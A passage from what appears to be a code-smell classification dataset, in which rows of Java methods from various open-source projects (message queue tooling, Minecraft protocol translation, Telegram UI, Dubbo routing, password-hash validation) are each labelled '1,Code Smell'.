 * @param topicDeployMap     the topic deploy configurations that needs to be stored
 * @param strBuff          the string buffer
 * @param result           the process result
 * @return         the process result
 */
private boolean writeTopicDeployInfo(Map<String,TopicDeployEntity> topicDeployMap,StringBuilder strBuff,ProcessResult result){
  if (topicDeployMap.isEmpty()) {
    return true;
  }
  int count=0;
  Map<String,String> inParamMap=new HashMap<>();
  Map<String,TopicDeployEntity> sysTopicDeployMap=new HashMap<>();
  for (  TopicDeployEntity entity : topicDeployMap.values()) {
    if (entity.getTopicName().equals(TServerConstants.OFFSET_HISTORY_NAME)) {
      sysTopicDeployMap.put(entity.getRecordKey(),entity);
      continue;
    }
    if (count++ > 0) {
      strBuff.append("","");
    }
    entity.toWebJsonStr(strBuff,true,true);
    if (strBuff.length() > maxDataLength || count % TServerConstants.CFG_BATCH_BROKER_OPERATE_MAX_COUNT == 0) {
      inParamMap.put(""topicJsonSet"",""["" + strBuff.toString() + ""]"");
      strBuff.delete(0,strBuff.length());
      inParamMap.put(""createUser"",curOperator);
      inParamMap.put(""modifyUser"",curOperator);
      if (!writeDataToMaster(""admin_bath_add_topic_deploy_info"",authToken,inParamMap,strBuff,result)) {
        return false;
      }
      count=0;
      inParamMap.clear();
      strBuff.delete(0,strBuff.length());
    }
  }
  if (strBuff.length() > 0) {
    inParamMap.put(""topicJsonSet"",""["" + strBuff.toString() + ""]"");
    strBuff.delete(0,strBuff.length());
    inParamMap.put(""createUser"",curOperator);
    inParamMap.put(""modifyUser"",curOperator);
    if (!writeDataToMaster(""admin_bath_add_topic_deploy_info"",authToken,inParamMap,strBuff,result)) {
      return false;
    }
    strBuff.delete(0,strBuff.length());
  }
  count=0;
  inParamMap.clear();
  for (  TopicDeployEntity entity : sysTopicDeployMap.values()) {
    if (count++ > 0) {
      strBuff.append("","");
    }
    entity.toWebJsonStr(strBuff,true,true);
    if (strBuff.length() > maxDataLength || count % TServerConstants.CFG_BATCH_BROKER_OPERATE_MAX_COUNT == 0) {
      inParamMap.put(""topicJsonSet"",""["" + strBuff.toString() + ""]"");
      strBuff.delete(0,strBuff.length());
      inParamMap.put(""createUser"",curOperator);
      inParamMap.put(""modifyUser"",curOperator);
      if (!writeDataToMaster(""admin_batch_update_topic_deploy_info"",authToken,inParamMap,strBuff,result)) {
        return false;
      }
      count=0;
      inParamMap.clear();
      strBuff.delete(0,strBuff.length());
    }
  }
  if (strBuff.length() > 0) {
    inParamMap.put(""topicJsonSet"",""["" + strBuff.toString() + ""]"");
    strBuff.delete(0,strBuff.length());
    inParamMap.put(""createUser"",curOperator);
    inParamMap.put(""modifyUser"",curOperator);
    if (!writeDataToMaster(""admin_batch_update_topic_deploy_info"",authToken,inParamMap,strBuff,result)) {
      return false;
    }
    strBuff.delete(0,strBuff.length());
  }
  return true;
}",1,Code Smell
"/** 
 * Calculate the levels needed for combining the enchantments of two items
 * @param session  Geyser session
 * @param input    an item with durability
 * @param material a matching item
 * @param bedrock  True to count enchantments like Bedrock, False to count like Java
 * @return the number of levels needed or -1 if no enchantments can be applied
 */
private int calcMergeEnchantmentCost(GeyserSession session,GeyserItemStack input,GeyserItemStack material,boolean bedrock){
  boolean hasCompatible=false;
  Object2IntMap<Enchantment> combinedEnchantments=getEnchantments(session,input);
  int cost=0;
  for (  Object2IntMap.Entry<Enchantment> entry : getEnchantments(session,material).object2IntEntrySet()) {
    Enchantment enchantment=entry.getKey();
    boolean canApply=isEnchantedBook(input) || session.getTagCache().is(enchantment.supportedItems(),input.asItem());
    List<Enchantment> incompatibleEnchantments=enchantment.exclusiveSet().resolve(session);
    for (    Enchantment incompatible : incompatibleEnchantments) {
      if (combinedEnchantments.containsKey(incompatible)) {
        canApply=false;
        if (!bedrock) {
          cost++;
        }
      }
    }
    if (canApply || (!bedrock && session.getGameMode() == GameMode.CREATIVE)) {
      int currentLevel=combinedEnchantments.getOrDefault(enchantment,0);
      int newLevel=entry.getIntValue();
      if (newLevel == currentLevel) {
        newLevel++;
      }
      newLevel=Math.max(currentLevel,newLevel);
      if (newLevel > enchantment.maxLevel()) {
        newLevel=enchantment.maxLevel();
      }
      combinedEnchantments.put(enchantment,newLevel);
      int rarityMultiplier=enchantment.anvilCost();
      if (isEnchantedBook(material) && rarityMultiplier > 1) {
        rarityMultiplier/=2;
      }
      if (bedrock) {
        if (newLevel > currentLevel) {
          hasCompatible=true;
        }
        if (enchantment.bedrockEnchantment() == BedrockEnchantment.IMPALING) {
          rarityMultiplier/=2;
        }
 else         if (enchantment.bedrockEnchantment() == null) {
          rarityMultiplier=0;
        }
        cost+=rarityMultiplier * (newLevel - currentLevel);
      }
 else {
        hasCompatible=true;
        cost+=rarityMultiplier * newLevel;
      }
    }
  }
  if (!hasCompatible) {
    return -1;
  }
  return cost;
}",1,Code Smell
"protected Pair<LIMEExplanation,List<Example<Regressor>>> explainWithSamples(Map<String,String> input){
  Optional<Example<Label>> optExample=generator.generateExample(input,false);
  if (optExample.isPresent()) {
    Example<Label> example=optExample.get();
    if ((textDomain.size() == 0) && (binarisedCDFs.size() == 0)) {
      return explainWithSamples(example);
    }
 else {
      Prediction<Label> prediction=innerModel.predict(example);
      ArrayExample<Regressor> labelledExample=new ArrayExample<>(transformOutput(prediction));
      for (      Feature f : example) {
        if (tabularDomain.getID(f.getName()) != -1) {
          labelledExample.add(f);
        }
      }
      SparseVector tabularVector=SparseVector.createSparseVector(labelledExample,tabularDomain,false);
      Map<String,String> exampleTextValues=new HashMap<>();
      Map<String,List<Token>> exampleTextTokens=new HashMap<>();
      for (      Map.Entry<String,FieldProcessor> e : textFields.entrySet()) {
        String value=input.get(e.getKey());
        if (value != null) {
          List<Token> tokens=tokenizerThreadLocal.get().tokenize(value);
          for (int i=0; i < tokens.size(); i++) {
            labelledExample.add(nameFeature(e.getKey(),tokens.get(i).text,i),1.0);
          }
          exampleTextValues.put(e.getKey(),value);
          exampleTextTokens.put(e.getKey(),tokens);
        }
      }
      List<Example<Regressor>> sample=sampleData(tabularVector,exampleTextValues,exampleTextTokens);
      SparseModel<Regressor> model=trainExplainer(labelledExample,sample);
      List<Prediction<Regressor>> predictions=new ArrayList<>(model.predict(sample));
      predictions.add(model.predict(labelledExample));
      RegressionEvaluation evaluation=evaluator.evaluate(model,predictions,new SimpleDataSourceProvenance(""LIMEColumnar sampled data"",regressionFactory));
      return new Pair<>(new LIMEExplanation(model,prediction,evaluation),sample);
    }
  }
 else {
    throw new IllegalArgumentException(""Label not found in input "" + input.toString());
  }
}",1,Code Smell
"@Override protected void renderWindow(GuiGraphics graphics,int mouseX,int mouseY,float partialTicks){
  int x=guiLeft;
  int y=guiTop - 8;
  AllGuiTextures.CLIPBOARD.render(graphics,x,y);
  graphics.drawString(font,Components.translatable(""book.pageIndicator"",currentPage + 1,getNumPages()),x + 150,y + 9,0x43ffffff,false);
  for (int i=0; i < currentEntries.size(); i++) {
    ClipboardEntry clipboardEntry=currentEntries.get(i);
    boolean checked=clipboardEntry.checked;
    int iconOffset=clipboardEntry.icon.isEmpty() ? 0 : 16;
    graphics.drawString(font,""\u25A1"",x + 45,y + 51,checked ? 0x668D7F6B : 0xff8D7F6B,false);
    if (checked)     graphics.drawString(font,""\u2714"",x + 45,y + 50,0x31B25D,false);
    List<FormattedCharSequence> split=font.split(clipboardEntry.text,150 - iconOffset);
    if (split.isEmpty()) {
      y+=12;
      continue;
    }
    if (!clipboardEntry.icon.isEmpty())     graphics.renderItem(clipboardEntry.icon,x + 54,y + 50);
    for (    FormattedCharSequence sequence : split) {
      if (i != editingIndex)       graphics.drawString(font,sequence,x + 58 + iconOffset,y + 50,checked ? 0x31B25D : 0x311A00,false);
      y+=9;
    }
    y+=3;
  }
  if (editingIndex == -1)   return;
  boolean checked=currentEntries.get(editingIndex).checked;
  setFocused(null);
  DisplayCache cache=getDisplayCache();
  for (  LineInfo line : cache.lines)   graphics.drawString(font,line.asComponent,line.x,line.y,checked ? 0x31B25D : 0x311A00,false);
  renderHighlight(cache.selection);
  renderCursor(graphics,cache.cursor,cache.cursorAtEnd);
}",1,Code Smell
"/** 
 * 鑾峰彇瑕佷慨鏀圭殑鍊�
 * @param entity
 * @param ignoreNulls
 */
public Set<String> obtainUpdateColumns(Object entity,boolean ignoreNulls,boolean includePrimary){
  MetaObject metaObject=EntityMetaObject.forObject(entity,reflectorFactory);
  Set<String> columns=new LinkedHashSet<>();
  if (entity instanceof UpdateWrapper) {
    Map<String,Object> updates=((UpdateWrapper)entity).getUpdates();
    if (updates.isEmpty()) {
      return Collections.emptySet();
    }
    for (    String property : updates.keySet()) {
      String column=getColumnByProperty(property);
      if (onUpdateColumns != null && onUpdateColumns.containsKey(column)) {
        continue;
      }
      if (ObjectUtil.equalsAny(column,versionColumn,tenantIdColumn)) {
        continue;
      }
      if (!includePrimary && ArrayUtil.contains(primaryColumns,column)) {
        continue;
      }
      columns.add(column);
    }
  }
 else {
    for (    String column : this.columns) {
      if (onUpdateColumns != null && onUpdateColumns.containsKey(column)) {
        continue;
      }
      if (ObjectUtil.equalsAny(column,versionColumn,tenantIdColumn)) {
        continue;
      }
      Object value=buildColumnSqlArg(metaObject,column);
      if (ignoreNulls && value == null) {
        continue;
      }
      columns.add(column);
    }
  }
  return columns;
}
",1,Code Smell
"public void prepare(){
  duration=0;
  ArrayList<SamplePresentationTime> original=new ArrayList<>(samplePresentationTimes);
  Collections.sort(samplePresentationTimes,(o1,o2) -> {
    if (o1.presentationTime > o2.presentationTime) {
      return 1;
    }
 else     if (o1.presentationTime < o2.presentationTime) {
      return -1;
    }
    return 0;
  }
);
  long lastPresentationTimeUs=0;
  sampleDurations=new long[samplePresentationTimes.size()];
  long minDelta=Long.MAX_VALUE;
  boolean outOfOrder=false;
  for (int a=0; a < samplePresentationTimes.size(); a++) {
    SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
    long delta=presentationTime.presentationTime - lastPresentationTimeUs;
    lastPresentationTimeUs=presentationTime.presentationTime;
    sampleDurations[presentationTime.index]=delta;
    if (presentationTime.index != 0) {
      duration+=delta;
    }
    if (delta > 0 && delta < Integer.MAX_VALUE) {
      minDelta=Math.min(minDelta,delta);
    }
    if (presentationTime.index != a) {
      outOfOrder=true;
    }
  }
  if (sampleDurations.length > 0) {
    sampleDurations[0]=minDelta;
    duration+=minDelta;
  }
  for (int a=1; a < original.size(); a++) {
    original.get(a).dt=sampleDurations[a] + original.get(a - 1).dt;
  }
  if (outOfOrder) {
    sampleCompositions=new int[samplePresentationTimes.size()];
    for (int a=0; a < samplePresentationTimes.size(); a++) {
      SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
      sampleCompositions[presentationTime.index]=(int)(presentationTime.presentationTime - presentationTime.dt);
    }
  }
}",1,Code Smell
"public static Map<String,MatchPair> parseRule(String rule) throws ParseException {
  Map<String,MatchPair> condition=new HashMap<String,MatchPair>();
  if (StringUtils.isBlank(rule)) {
    return condition;
  }
  MatchPair pair=null;
  Set<String> values=null;
  final Matcher matcher=ROUTE_PATTERN.matcher(rule);
  while (matcher.find()) {
    String separator=matcher.group(1);
    String content=matcher.group(2);
    if (separator == null || separator.length() == 0) {
      pair=new MatchPair();
      condition.put(content,pair);
    }
 else     if (""&"".equals(separator)) {
      if (condition.get(content) == null) {
        pair=new MatchPair();
        condition.put(content,pair);
      }
 else {
        condition.put(content,pair);
      }
    }
 else     if (""="".equals(separator)) {
      if (pair == null)       throw new ParseException(""Illegal route rule \"""" + rule + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."",matcher.start());
      values=pair.matches;
      values.add(content);
    }
 else     if (""!="".equals(separator)) {
      if (pair == null)       throw new ParseException(""Illegal route rule \"""" + rule + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."",matcher.start());
      values=pair.unmatches;
      values.add(content);
    }
 else     if ("","".equals(separator)) {
      if (values == null || values.size() == 0)       throw new ParseException(""Illegal route rule \"""" + rule + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."",matcher.start());
      values.add(content);
    }
 else {
      throw new ParseException(""Illegal route rule \"""" + rule + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."",matcher.start());
    }
  }
  return condition;
}",1,Code Smell
"/** 
 * This picks a dominant color, looking for high-saturation, high-value, repeated hues.
 * @param bitmap The bitmap to scan
 */
public int findDominantColorByHue(@NonNull final Bitmap bitmap){
  return findDominantColorByHue(bitmap,NUM_SAMPLES);
}
/** 
 * This picks a dominant color, looking for high-saturation, high-value, repeated hues.
 * @param bitmap The bitmap to scan
 */
protected int findDominantColorByHue(@NonNull final Bitmap bitmap,final int samples){
  final int height=bitmap.getHeight();
  final int width=bitmap.getWidth();
  int sampleStride=(int)Math.sqrt((height * width) / samples);
  if (sampleStride < 1) {
    sampleStride=1;
  }
  float[] hsv=mTmpHsv;
  Arrays.fill(hsv,0);
  float[] hueScoreHistogram=mTmpHueScoreHistogram;
  Arrays.fill(hueScoreHistogram,0);
  float highScore=-1;
  int bestHue=-1;
  int[] pixels=mTmpPixels;
  Arrays.fill(pixels,0);
  int pixelCount=0;
  for (int y=0; y < height; y+=sampleStride) {
    for (int x=0; x < width; x+=sampleStride) {
      int argb=bitmap.getPixel(x,y);
      int alpha=0xFF & (argb >> 24);
      if (alpha < 0x80) {
        continue;
      }
      int rgb=argb | 0xFF000000;
      Color.colorToHSV(rgb,hsv);
      int hue=(int)hsv[0];
      if (hue < 0 || hue >= hueScoreHistogram.length) {
        continue;
      }
      if (pixelCount < samples) {
        pixels[pixelCount++]=rgb;
      }
      float score=hsv[1] * hsv[2];
      hueScoreHistogram[hue]+=score;
      if (hueScoreHistogram[hue] > highScore) {
        highScore=hueScoreHistogram[hue];
        bestHue=hue;
      }
    }
  }
  SparseArray<Float> rgbScores=mTmpRgbScores;
  rgbScores.clear();
  int bestColor=0xff000000;
  highScore=-1;
  for (int i=0; i < pixelCount; i++) {
    int rgb=pixels[i];
    Color.colorToHSV(rgb,hsv);
    int hue=(int)hsv[0];
    if (hue == bestHue) {
      float s=hsv[1];
      float v=hsv[2];
      int bucket=(int)(s * 100) + (int)(v * 10000);
      float score=s * v;
      Float oldTotal=rgbScores.get(bucket);
      float newTotal=oldTotal == null ? score : oldTotal + score;
      rgbScores.put(bucket,newTotal);
      if (newTotal > highScore) {
        highScore=newTotal;
        bestColor=rgb;
      }
    }
  }
  return bestColor;
}",1,Code Smell
"public void restoreFromBundle(Context context,Bundle bundle,SceneComponentFactory rootSceneComponentFactory,State targetState){
  this.mBackStackList.restoreFromBundle(context,bundle,rootSceneComponentFactory);
  ArrayList<Bundle> bundleList=bundle.getParcelableArrayList(ParcelConstants.KEY_NAVIGATION_SCENE_MANAGER_TAG);
  List<Record> recordList=this.mBackStackList.getCurrentRecordList();
  if (this.mOnlyRestoreVisibleScene) {
    int nonTranslucentIndex=0;
    for (int i=recordList.size() - 1; i >= 0; i--) {
      Record record=recordList.get(i);
      if (!record.mIsTranslucent) {
        nonTranslucentIndex=i;
        break;
      }
    }
    for (int i=nonTranslucentIndex; i <= recordList.size() - 1; i++) {
      Record record=recordList.get(i);
      Bundle sceneBundle=bundleList.get(i);
      moveState(this.mNavigationScene,record.mScene,State.ACTIVITY_CREATED,sceneBundle,false,null);
      if (i == recordList.size() - 1) {
        restoreActivityStatus(record.mActivityStatusRecord);
      }
    }
    for (int i=0; i < nonTranslucentIndex; i++) {
      Record record=recordList.get(i);
      record.mPreviousSavedState=bundleList.get(i);
    }
  }
 else {
    for (int i=0; i <= recordList.size() - 1; i++) {
      Record record=recordList.get(i);
      Bundle sceneBundle=bundleList.get(i);
      moveState(this.mNavigationScene,record.mScene,State.ACTIVITY_CREATED,sceneBundle,false,null);
    }
  }
}",1,Code Smell
"@Override public IInterface onQueryLocalInterface(String descriptor,IInterface iInterface){
  if (IActivityManager.class.getName().equals(descriptor)) {
    IActivityManager am=IActivityManager.Stub.asInterface(original);
    return (IInterface)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{IActivityManager.class},(instance,method,args) -> {
      if (DEBUG_AMS) {
        XLog.d(""IActivityManager %s %s"",method.getName(),Arrays.toString(args));
      }
      if (""bindIsolatedService"".equals(method.getName())) {
        int res=(int)tryInvoke(am,method,args);
        XLog.d(""IActivityManager bindIsolatedService, res="" + res);
        if (res < 0) {
          XLog.d(""IActivityManager bindIsolatedService result < 0, we will fix it to 0, "" + Arrays.toString(args));
          res=0;
        }
        return res;
      }
      if (""startService"".equals(method.getName())) {
        ComponentName componentName=(ComponentName)tryInvoke(am,method,args);
        if (componentName == null)         return null;
        if (componentName.getPackageName() == null)         return componentName;
        if (componentName.getPackageName().equals(""!"") || componentName.getPackageName().equals(""?"") || componentName.getPackageName().equals(""!!"")) {
          XLog.d(""IActivityManager Try to fix startServiceLocked ERROR throw by system!!!"" + Arrays.toString(args));
          return null;
        }
        return componentName;
      }
      if (""getContentProvider"".equals(method.getName())) {
        return handleGetProvider(am,method,args);
      }
      return tryInvoke(am,method,args);
    }
);
  }
  return iInterface;
}",1,Code Smell
"/** 
 * Remove unavailable records All unavailable records will be removed after the specified time
 */
public void rmvExpiredUnavailableBrokers(){
  long curTime=System.currentTimeMillis();
  Set<Integer> expiredBrokers=new HashSet<>();
  for (  Map.Entry<Integer,Long> entry : brokerUnavailableMap.entrySet()) {
    if (entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    if (curTime - entry.getValue() > unAvailableFbdDurationMs) {
      expiredBrokers.add(entry.getKey());
    }
  }
  if (!expiredBrokers.isEmpty()) {
    for (    Integer brokerId : expiredBrokers) {
      Long lastAddTime=brokerUnavailableMap.get(brokerId);
      if (lastAddTime == null) {
        continue;
      }
      if (curTime - lastAddTime > unAvailableFbdDurationMs) {
        brokerUnavailableMap.remove(brokerId,lastAddTime);
      }
    }
  }
}
",1,Code Smell
"private boolean hasMultipleEnabledSubtypes(final boolean shouldIncludeAuxiliarySubtypes,final List<InputMethodInfo> imiList){
  int filteredImisCount=0;
  for (  InputMethodInfo imi : imiList) {
    if (filteredImisCount > 1)     return true;
    final List<InputMethodSubtype> subtypes=getEnabledInputMethodSubtypeList(imi,true);
    if (subtypes.isEmpty()) {
      ++filteredImisCount;
      continue;
    }
    int auxCount=0;
    for (    InputMethodSubtype subtype : subtypes) {
      if (subtype.isAuxiliary()) {
        ++auxCount;
      }
    }
    final int nonAuxCount=subtypes.size() - auxCount;
    if (nonAuxCount > 0 || (shouldIncludeAuxiliarySubtypes && auxCount > 1)) {
      ++filteredImisCount;
    }
  }
  if (filteredImisCount > 1) {
    return true;
  }
  final List<InputMethodSubtype> subtypes=getMyEnabledInputMethodSubtypeList(true);
  int keyboardCount=0;
  for (  InputMethodSubtype subtype : subtypes) {
    if (KEYBOARD_MODE.equals(subtype.getMode())) {
      ++keyboardCount;
    }
  }
  return keyboardCount > 1;
}",1,Code Smell
"@Override public void run(){
  int finalMiniCapPort=PortTool.getPort();
  AndroidDeviceBridgeTool.forward(iDevice,finalMiniCapPort,""minicap"");
  Socket capSocket=null;
  InputStream inputStream=null;
  try {
    capSocket=new Socket(""localhost"",finalMiniCapPort);
    inputStream=capSocket.getInputStream();
    int len=1024;
    while (miniCapPro.isAlive()) {
      byte[] buffer=new byte[len];
      int realLen;
      realLen=inputStream.read(buffer);
      if (buffer.length != realLen && realLen >= 0) {
        buffer=subByteArray(buffer,0,realLen);
      }
      if (realLen >= 0) {
        dataQueue.offer(buffer);
      }
    }
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
 finally {
    if (miniCapPro.isAlive()) {
      miniCapPro.interrupt();
      log.info(""miniCap thread closed."");
    }
    if (capSocket != null && capSocket.isConnected()) {
      try {
        capSocket.close();
        log.info(""miniCap socket closed."");
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
    if (inputStream != null) {
      try {
        inputStream.close();
        log.info(""miniCap input stream closed."");
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
  }
  AndroidDeviceBridgeTool.removeForward(iDevice,finalMiniCapPort,""minicap"");
  if (session != null) {
    ScreenMap.getMap().remove(session);
  }
}",1,Code Smell
"private void updateBotButton(boolean animated){
  if (!isChat) {
    return;
  }
  if (parentFragment != null && !parentFragment.openAnimationEnded) {
    animated=false;
  }
  boolean hasBotWebView=hasBotWebView();
  boolean canShowBotsMenu=botMenuButtonType != BotMenuButtonType.NO_BUTTON && dialog_id > 0;
  boolean wasVisible=botButton != null && botButton.getVisibility() == VISIBLE;
  if (hasBotWebView || hasBotCommands || hasQuickReplies|| botReplyMarkup != null) {
    if (botReplyMarkup != null) {
      if (isPopupShowing() && currentPopupContentType == POPUP_CONTENT_BOT_KEYBOARD && botReplyMarkup.is_persistent) {
        if (botButton != null && botButton.getVisibility() != GONE) {
          botButton.setVisibility(GONE);
        }
      }
 else {
        createBotButton();
        if (botButton.getVisibility() != VISIBLE) {
          botButton.setVisibility(VISIBLE);
        }
        botButtonDrawable.setIcon(R.drawable.input_bot2,true);
        botButton.setContentDescription(LocaleController.getString(""AccDescrBotKeyboard"",R.string.AccDescrBotKeyboard));
      }
    }
 else {
      if (!canShowBotsMenu && !NaConfig.INSTANCE.getHideBotButtonInInputField().Bool()) {
        createBotButton();
        botButtonDrawable.setIcon(R.drawable.input_bot1,true);
        botButton.setContentDescription(LocaleController.getString(""AccDescrBotCommands"",R.string.AccDescrBotCommands));
        botButton.setVisibility(VISIBLE);
      }
 else       if (botButton != null) {
        botButton.setVisibility(GONE);
      }
    }
  }
 else   if (botButton != null) {
    botButton.setVisibility(GONE);
  }
  if (canShowBotsMenu) {
    createBotCommandsMenuButton();
  }
  boolean changed=(botButton != null && botButton.getVisibility() == VISIBLE) != wasVisible;
  if (botCommandsMenuButton != null) {
    boolean wasWebView=botCommandsMenuButton.isWebView;
    botCommandsMenuButton.setWebView(botMenuButtonType == BotMenuButtonType.WEB_VIEW);
    boolean textChanged=botCommandsMenuButton.setMenuText(botMenuButtonType == BotMenuButtonType.COMMANDS ? LocaleController.getString(R.string.BotsMenuTitle) : botMenuWebViewTitle);
    AndroidUtilities.updateViewVisibilityAnimated(botCommandsMenuButton,canShowBotsMenu,0.5f,animated);
    changed=changed || textChanged || wasWebView != botCommandsMenuButton.isWebView;
  }
  if (changed && animated) {
    beginDelayedTransition();
    boolean show=botButton != null && botButton.getVisibility() == VISIBLE;
    if (show != wasVisible && botButton != null) {
      botButton.setVisibility(VISIBLE);
      if (show) {
        botButton.setAlpha(0f);
        botButton.setScaleX(0.1f);
        botButton.setScaleY(0.1f);
      }
 else       if (!show) {
        botButton.setAlpha(1f);
        botButton.setScaleX(1f);
        botButton.setScaleY(1f);
      }
      AndroidUtilities.updateViewVisibilityAnimated(botButton,show,0.1f,true);
    }
  }
  updateFieldRight(2);
  attachLayout.setPivotX(dp((botButton == null || botButton.getVisibility() == GONE) && (notifyButton == null || notifyButton.getVisibility() == GONE) ? 48 : 96));
}",1,Code Smell
"public String minWindow(String s,String t){
  int[] tArr=new int[256];
  int[] sArr=new int[256];
  for (int i=0; i < t.length(); i++) {
    tArr[t.charAt(i)]++;
  }
  int start=0;
  int startIndex=-1;
  int minLen=Integer.MAX_VALUE;
  String result="""";
  int count=0;
  for (int i=0; i < s.length(); i++) {
    sArr[s.charAt(i)]++;
    if (tArr[s.charAt(i)] > 0 && (tArr[s.charAt(i)] >= sArr[s.charAt(i)])) {
      count++;
    }
    if (count == t.length()) {
      while (sArr[s.charAt(start)] > tArr[s.charAt(start)] || tArr[s.charAt(start)] == 0) {
        if (sArr[s.charAt(start)] > tArr[s.charAt(start)]) {
          sArr[s.charAt(start)]--;
        }
        start++;
      }
      if (minLen > i - start + 1) {
        startIndex=start;
        minLen=i - start + 1;
      }
    }
  }
  if (startIndex == -1)   return """";
 else   return s.substring(startIndex,startIndex + minLen);
}",1,Code Smell
"public void updateSelectedMediaTabText(){
  if (sharedMediaLayout == null || mediaCounterTextView == null) {
    return;
  }
  int id=sharedMediaLayout.getClosestTab();
  int[] mediaCount=sharedMediaPreloader.getLastMediaCount();
  if (id == 0) {
    if (mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY] == 0 && mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY] == 0) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Media"",mediaCount[MediaDataController.MEDIA_PHOTOVIDEO]));
    }
 else     if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_PHOTOS_ONLY || mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY] == 0) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Photos"",mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY]));
    }
 else     if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_VIDEOS_ONLY || mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY] == 0) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Videos"",mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY]));
    }
 else {
      String str=String.format(""%s, %s"",LocaleController.formatPluralString(""Photos"",mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY]),LocaleController.formatPluralString(""Videos"",mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY]));
      mediaCounterTextView.setText(str);
    }
  }
 else   if (id == 1) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Files"",mediaCount[MediaDataController.MEDIA_FILE]));
  }
 else   if (id == 2) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Voice"",mediaCount[MediaDataController.MEDIA_AUDIO]));
  }
 else   if (id == 3) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Links"",mediaCount[MediaDataController.MEDIA_URL]));
  }
 else   if (id == 4) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""MusicFiles"",mediaCount[MediaDataController.MEDIA_MUSIC]));
  }
 else   if (id == 5) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""GIFs"",mediaCount[MediaDataController.MEDIA_GIF]));
  }
 else   if (id == 6) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""CommonGroups"",userInfo.common_chats_count));
  }
 else   if (id == 7) {
    mediaCounterTextView.setText(onlineTextView[1].getText());
  }
}",1,Code Smell
"public int getMaxNameWidth(){
  if (documentAttachType == DOCUMENT_ATTACH_TYPE_STICKER || documentAttachType == DOCUMENT_ATTACH_TYPE_WALLPAPER || currentMessageObject.type == MessageObject.TYPE_ROUND_VIDEO) {
    int maxWidth;
    if (AndroidUtilities.isTablet()) {
      maxWidth=AndroidUtilities.getMinTabletSide() - AndroidUtilities.dp(needDrawAvatar() ? 42 : 0);
    }
 else {
      maxWidth=Math.min(getParentWidth(),AndroidUtilities.displaySize.y) - AndroidUtilities.dp(needDrawAvatar() ? 42 : 0);
    }
    if (currentMessageObject != null && currentMessageObject.isSaved && currentMessageObject.isOutOwner() && checkNeedDrawShareButton(currentMessageObject)) {
      maxWidth-=dp(25);
    }
    if (isPlayingRound && (currentMessageObject == null || !currentMessageObject.isVoiceTranscriptionOpen())) {
      int backgroundWidthLocal=backgroundWidth - (AndroidUtilities.roundPlayingMessageSize - AndroidUtilities.roundMessageSize);
      return maxWidth - backgroundWidthLocal - AndroidUtilities.dp(57);
    }
    return maxWidth - backgroundWidth - AndroidUtilities.dp(57);
  }
  if (currentMessagesGroup != null && !currentMessagesGroup.isDocuments) {
    int dWidth;
    if (AndroidUtilities.isTablet()) {
      dWidth=AndroidUtilities.getMinTabletSide();
    }
 else {
      dWidth=getParentWidth();
    }
    int firstLineWidth=0;
    for (int a=0; a < currentMessagesGroup.posArray.size(); a++) {
      MessageObject.GroupedMessagePosition position=currentMessagesGroup.posArray.get(a);
      if (position.minY == 0) {
        firstLineWidth+=Math.ceil((position.pw + position.leftSpanOffset) / 1000.0f * dWidth);
      }
 else {
        break;
      }
    }
    return firstLineWidth - AndroidUtilities.dp(31 + (isAvatarVisible ? 48 : 0));
  }
 else   if (currentMessageObject.type == MessageObject.TYPE_EMOJIS) {
    return Math.max(currentMessageObject.textWidth,(int)((AndroidUtilities.displaySize.x - AndroidUtilities.dp(52) - (isAvatarVisible ? AndroidUtilities.dp(48) : 0)) * .5f));
  }
 else {
    int width=backgroundWidth;
    if (currentMessageObject != null && currentMessageObject.isSaved && currentMessageObject.isOutOwner() && checkNeedDrawShareButton(currentMessageObject)) {
      width-=dp(25);
    }
    width-=dp(mediaBackground ? 22 : 31);
    return width;
  }
}",1,Code Smell
"public static void assertSuperTokensSupportInputPasswordHashFormat(AppIdentifier appIdentifier,Main main,String passwordHash,@Nullable CoreConfig.PASSWORD_HASHING_ALG hashingAlgorithm) throws UnsupportedPasswordHashingFormatException, TenantOrAppNotFoundException {
  if (hashingAlgorithm == null) {
    if (ParsedFirebaseSCryptResponse.fromHashString(passwordHash) != null) {
      Config.getConfig(appIdentifier.getAsPublicTenantIdentifier(),main).getFirebase_password_hashing_signer_key();
      return;
    }
    if (!(isInputHashInBcryptFormat(passwordHash) || isInputHashInArgon2Format(passwordHash))) {
      throw new UnsupportedPasswordHashingFormatException(""Password hash is in invalid format"");
    }
    return;
  }
  if (hashingAlgorithm.equals(CoreConfig.PASSWORD_HASHING_ALG.ARGON2)) {
    if (!isInputHashInArgon2Format(passwordHash)) {
      throw new UnsupportedPasswordHashingFormatException(""Password hash is in invalid Argon2 format"");
    }
    return;
  }
  if (hashingAlgorithm.equals(CoreConfig.PASSWORD_HASHING_ALG.BCRYPT)) {
    if (!isInputHashInBcryptFormat(passwordHash)) {
      throw new UnsupportedPasswordHashingFormatException(""Password hash is in invalid BCrypt format"");
    }
